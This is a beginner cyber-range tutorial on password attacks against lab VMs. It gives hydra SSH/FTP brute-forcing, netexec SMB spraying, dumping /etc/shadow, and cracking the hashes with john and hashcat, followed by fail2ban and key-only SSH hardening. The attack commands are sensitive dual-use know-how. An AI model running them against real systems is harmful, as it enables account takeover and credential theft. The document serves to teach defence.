---
title: "Scenario 05 - Password attacks (online + offline)"
---

# Scenario 05 - Password attacks (online + offline)

> **Lab-only.** Every target here is a VM we own on the isolated a local model net (`10.13.37.0/24`). No
> route to the real LAN or the internet. You are attacking your own machines to learn how to defend
> them. Doing any of this to a system you do not own is a crime.

| | |
|---|---|
| **Goal** | Recover a login password two ways: guess it live against a network service (online), and crack a stolen hash on Kali (offline). Then harden the box so the same attack fails. |
| **Target** | `msf2` 10.13.37.20 (weak-password box) and `blue` 10.13.37.40 (the box you harden). |
| **Difficulty** | Beginner |
| **Est. time** | 60-90 min |
| **Prereqs** | Scenario 01/03 recon done; you can reach both targets from Kali. Comfort with a terminal. |
| **Start-from** | `kali` at snapshot `tools-ready`; `msf2` and `blue` at `clean-baseline`. `blue` is powered off by default, so start it first (below). |

## MITRE ATT&CK mapping
- **Credential Access / Brute Force - T1110**: `.001` password guessing, `.002` password cracking (offline), `.003` password spraying (SMB).
- **Credential Access / OS Credential Dumping: /etc/passwd and /etc/shadow - T1003.008** (reading the shadow file for offline cracking).
- **Defense Evasion / Valid Accounts - T1078**: the whole point of stealing a password is to log in as a real user.
- Defensive counterparts: MFA, account lockout, key-based auth, strong unique passphrases (mitigations M1032, M1027, M1036).

---

## 0. Set up the lab

`blue` is off by default. Start it and confirm both targets answer.

```bash
# on the your KVM host host (or any shell that can run virsh)
virsh -c qemu:///system start blue          # msf2 is usually already up
virsh -c qemu:///system list --all
```
**What you should see:** `blue` and `msf2` both `running`.

From Kali, confirm reachability and that SSH is open:

```bash
# on kali
ping -c1 10.13.37.20 && ping -c1 10.13.37.40
nmap -Pn -p 21,22,139,445 10.13.37.20 10.13.37.40
```
**What you should see:** both hosts reply; `22/tcp open ssh` on each. On `msf2` you should also see `21/tcp
open ftp` and (Samba) `139/445 open`. If `445` shows closed/filtered on `msf2`, skip the SMB-spray step 3.

Unzip the big wordlist once (Kali ships it gzipped):

```bash
# on kali - one-time; makes /usr/share/wordlists/rockyou.txt (~14M lines)
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
ls -l /usr/share/wordlists/rockyou.txt
```
**What you should see:** a ~139 MB `rockyou.txt`. (`-k` keeps the `.gz` so you can re-do this after a
snapshot revert.)

Build a tiny, targeted list for the demo so the crack is fast and deterministic. Real attackers do this
from OSINT (names, defaults, the vendor's docs). We already know this box ships defaults:

```bash
# on kali
mkdir -p ~/lab05 && cd ~/lab05
printf '%s\n' msfadmin user root admin service klog postgres sys > users.txt
printf '%s\n' msfadmin user password 123456 root admin service > passwords.txt
cat users.txt passwords.txt
```

---

## 1. Online attack: brute-force SSH with hydra (T1110.001)

**What it does:** `hydra` opens many SSH sessions and tries each user/password pair until one logs in. This
is *online* because it hammers the live service; it is slow and noisy, but deadly against weak or default
passwords.

```bash
# on kali, in ~/lab05
hydra -L users.txt -P passwords.txt -t 4 -f -V ssh://10.13.37.20
```
Flags: `-L`/`-P` = user/password lists, `-t 4` = 4 parallel tries (gentle, see throttling below), `-f` =
stop at the first hit, `-V` = show every attempt.

**What you should see:** a stream of `[ATTEMPT]` lines, then a green hit:
```
[22][ssh] host: 10.13.37.20   login: msfadmin   password: msfadmin
```
That is a cracked account. Log in to prove it:
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa msfadmin@10.13.37.20
# password: msfadmin  ->  you get a shell
```
(The legacy `-o` flags are needed because `msf2` runs a 2008-era SSH; a modern client refuses its old
crypto by default.)

**Troubleshooting - hydra can't connect to msf2's ancient SSH.** Some `hydra`/`libssh` builds refuse
`msf2`'s obsolete key exchange and print `all children died` or `could not connect`. That is the same old
crypto, not a wrong password. Two reliable fallbacks, same weak creds:

```bash
# a) FTP on msf2 - no crypto negotiation, always works
hydra -L users.txt -P passwords.txt -t 4 -f -V ftp://10.13.37.20

# b) medusa, another guesser (still libssh, but worth a try)
medusa -h 10.13.37.20 -U users.txt -P passwords.txt -M ssh -t 4 -f
```
**What you should see (FTP):** `[21][ftp] host: 10.13.37.20 login: msfadmin password: msfadmin`.

### 1b. Same tool, real wordlist, against the hardening target
Now point hydra at `blue` with the big list. `blue`'s account `analyst` has a *strong* password
(`BlueLab-2026`, not in any wordlist), so this teaches the other half of the lesson: a strong passphrase
already defeats a dictionary, and the service is still exposed to guessing.

```bash
# on kali - throttled so we do not lock ourselves out (see below); this will NOT crack
hydra -l analyst -P /usr/share/wordlists/rockyou.txt -t 4 -W 1 -f -V ssh://10.13.37.40
```
**What you should see:** attempt after attempt, no hit. Stop it with `Ctrl-C` after a minute. The takeaway:
`analyst` is safe *because of its password*, but SSH password login is still open. Step 5 closes it.

### Throttling to avoid lockout / detection
- `-t 4` keeps parallelism low; `-W 1` waits 1 s between tries; add `-w 3` for a 3 s response timeout.
- Against a box with lockout or fail2ban (we add it in step 5), too-fast guessing gets your IP **banned**
  or the account locked, which stalls the whole attack. Slow and targeted beats loud and fast.

---

## 2. Online attack: password spraying with netexec/nxc (T1110.003)

**What it does:** *spraying* flips brute-force around: one password, many users. It avoids lockout because
each account sees only one failed try. Here we spray SMB (Samba on `msf2`).

> Only if step 0 showed `445` open on `msf2`. If it was closed, skip to step 3.

```bash
# on kali - one password across many users
nxc smb 10.13.37.20 -u users.txt -p 'msfadmin' --continue-on-success
```
**What you should see:** lines per user; a valid pair is marked `[+]`, e.g.
`SMB 10.13.37.20 ... [+] <domain>\msfadmin:msfadmin`. Failures show `[-]`.

Spray a small password list across the users (still one password at a time internally):

```bash
nxc smb 10.13.37.20 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
`--no-bruteforce` pairs line-by-line (user1:pass1, user2:pass2); drop it to try every combination.

**Why this matters defensively:** spraying is the attack that beats naive lockout policies. You defend it
with MFA and with lockout that also watches *distinct-account* failures from one source, not just repeats
on one account.

---

## 3. Offline attack: steal a hash, crack it on Kali

Online guessing is limited by the network and by lockout. Once you have *any* shell, you steal the
password hashes and crack them offline on Kali, as fast as your GPU/CPU allows, with no lockout and no
noise on the target.

### 3a. Grab the hashes (T1003.008)
You already have `msfadmin` (step 1), and `msfadmin` can `sudo`.

```bash
# from your msfadmin ssh shell on msf2
sudo cat /etc/passwd > /tmp/p.txt
sudo cat /etc/shadow > /tmp/s.txt
exit
```
Copy both to Kali (over the lab net):
```bash
# on kali
scp -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa \
    msfadmin@10.13.37.20:/tmp/p.txt msfadmin@10.13.37.20:/tmp/s.txt ~/lab05/
```
**What you should see:** two files in `~/lab05`. `s.txt` lines look like
`user:$1$xxxx$....:...` - the `$1$` marks **MD5-crypt**, an old, weak hash.

Merge them into a john-friendly file:
```bash
# on kali
cd ~/lab05
unshadow p.txt s.txt > hashes.txt
head -n3 hashes.txt
```
**What you should see:** `passwd`+`shadow` merged, one `user:$1$...` line per account.

### 3b. Crack with John the Ripper (T1110.002)

**What it does:** `john` hashes candidate words with the same algorithm and compares to the stolen hash.
No target contact at all.

```bash
# on kali - let john auto-detect the format and run the default rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules ~/lab05/hashes.txt
# watch progress / show results:
john --show ~/lab05/hashes.txt
```
`--rules` mutates each word (capitalise, append digits, leetspeak) to catch `Password1!`-style variants.

**What you should see:** cracked accounts printed, e.g.
```
user:user
msfadmin:msfadmin
...
N password hashes cracked
```

### 3c. Crack the same hashes with hashcat

**What it does:** same idea, GPU-accelerated, with an explicit *hash-mode*. You must tell hashcat the
format: MD5-crypt is **mode 500**.

```bash
# on kali - isolate just the hash column for hashcat
cut -d: -f2 ~/lab05/hashes.txt | grep '^\$1\$' > ~/lab05/md5crypt.hash

hashcat -m 500 -a 0 ~/lab05/md5crypt.hash /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule
hashcat -m 500 ~/lab05/md5crypt.hash --show     # print cracked plaintexts
```
Flags: `-m 500` = MD5-crypt, `-a 0` = wordlist (straight) attack, `-r best64.rule` = 64 common mutations
per word.

**What you should see:** `Status....: Cracked` and lines like `$1$...:user`. If hashcat says "no OpenCL
device," add `--force` (fine in the lab; it drops to CPU).

### Reading hash formats (the key skill)
| Prefix in the hash | Algorithm | john format | hashcat `-m` |
|---|---|---|---|
| `$1$` | MD5-crypt (old Linux) | `md5crypt` | 500 |
| `$6$` | SHA-512-crypt (modern Linux) | `sha512crypt` | 1800 |
| `$y$` / `$2b$` | yescrypt / bcrypt | `bcrypt` | 3200 |
| 32 hex chars | raw MD5 (e.g. DVWA users) | `raw-md5` | 0 |
- `blue` (modern Debian) uses `$6$` or `$y$` - much slower to crack, which is the point of a good algorithm.
- **Alternative hash source:** the DVWA user table from scenario 03 dumps **raw-MD5** hashes. Crack those
  fast with `hashcat -m 0 dvwa.hash /usr/share/wordlists/rockyou.txt` or `john --format=raw-md5`.

---

## 4. Defense - make the box resist all of the above

The controls, cheapest-first. Apply them **on `blue`**, then re-attack to prove each one.

1. **Strong, unique passphrases + a password manager.** `analyst`'s `BlueLab-2026` already beat rockyou in
   step 1b. A 4+ random-word passphrase per account, stored in a manager (KeePassXC, Bitwarden), means no
   wordlist ever contains it. This alone defeats the *offline* crack too (there is nothing to guess).
2. **MFA.** Even a stolen password fails without the second factor. On Linux SSH that is
   `libpam-google-authenticator` (TOTP) or a hardware key. (Needs a package install; do it in a controlled
   internet window - `blue` is offline in the lab.)
3. **Account lockout / fail2ban.** Ban an IP after N failed logins - kills online brute-force and spraying.
4. **Key-based SSH, password auth off.** No password on the wire = nothing to guess or spray. This is the
   strongest single SSH control, so we prove it below.

### 4a. Control: fail2ban (bans the attacker's IP)
`blue` has no internet, so if `fail2ban` is not installed, do the install in a controlled window, or use
the pure-`sshd` control in 4b instead. If it is present:

```bash
# on blue as root (ssh root@10.13.37.40)
apt-get install -y fail2ban          # only in an internet window; otherwise use 4b
cat >/etc/fail2ban/jail.d/sshd.local <<'EOF'
[sshd]
enabled  = true
maxretry = 4
findtime = 10m
bantime  = 1h
EOF
systemctl enable --now fail2ban
fail2ban-client status sshd
```
**What you should see:** the `sshd` jail `enabled`, `Currently banned: 0`.

### 4b. Control: turn SSH password auth off, require keys (recommended, no internet needed)
First give yourself a key so you do not lock yourself out:

```bash
# on kali
ssh-keygen -t ed25519 -f ~/.ssh/blue_key -N ''
ssh-copy-id -i ~/.ssh/blue_key.pub analyst@10.13.37.40      # password BlueLab-2026 (last time you need it)
```
Then disable passwords on `blue`:
```bash
# on blue as root
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#\?KbdInteractiveAuthentication.*/KbdInteractiveAuthentication no/' /etc/ssh/sshd_config
# make sure no drop-in re-enables it:
grep -rniE 'passwordauthentication' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/
sshd -t && systemctl restart ssh
```
**What you should see:** `sshd -t` prints nothing (config OK); service restarts cleanly; the grep shows
`PasswordAuthentication no` and no conflicting `yes`.

---

## 5. Prove the fix (re-attack)

**Re-test the key still works, passwords do not:**
```bash
# on kali
ssh -i ~/.ssh/blue_key analyst@10.13.37.40 'echo KEY-LOGIN-OK'       # should print OK
```

**Re-run hydra against blue's SSH:**
```bash
# on kali
hydra -l analyst -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://10.13.37.40
```
**What you should see (password auth off):** hydra reports the target does not accept password logins and
finds nothing, e.g. `[ERROR] ... does not support password authentication` or every attempt fails
instantly. Compare to step 1b, where each attempt was actually processed.

**What you should see (fail2ban path):** after 4 fast failures hydra hangs / connections are refused; on
`blue`, `fail2ban-client status sshd` now shows `Currently banned: 1` and `Banned IP list: 10.13.37.10`.
Unban to continue testing: `fail2ban-client set sshd unbanip 10.13.37.10`.

Either way, the online attack that worked in step 1 no longer works. The strong passphrase from step 4(1)
also means the *offline* crack of `analyst` never succeeds even if the hash is stolen.

---

## Flags / evidence
- Screenshot/paste of hydra's green `login/password` hit on `msf2` (online crack).
- `john --show` and `hashcat --show` output listing cracked accounts (offline crack).
- `nxc` `[+]` line (spray hit), if SMB was open.
- Proof-of-fix: the failed hydra run against `blue` **after** hardening, plus `KEY-LOGIN-OK`.

## Cleanup / reset
```bash
# on kali
rm -rf ~/lab05                                   # remove stolen hashes and lists
# on the host - roll msf2 and blue back to pristine (shut down first, then revert)
virsh -c qemu:///system shutdown msf2 ; sleep 5 ; virsh -c qemu:///system snapshot-revert msf2 clean-baseline
virsh -c qemu:///system shutdown blue ; sleep 5 ; virsh -c qemu:///system snapshot-revert blue clean-baseline
```
(If a box will not shut down gracefully, use `virsh -c qemu:///system destroy <vm>` then the revert - the
targets are disposable.) A revert wipes the hashes, the fail2ban jail, and the sshd change, so the next
student starts clean.

## Go deeper
- Research: hydra says 'all children died' against msf2 ssh - what does that mean and how do I get the crack instead?
- Research: how do I know which hashcat -m mode a hash needs?
- Research: why does password spraying beat account lockout, and what stops spraying?
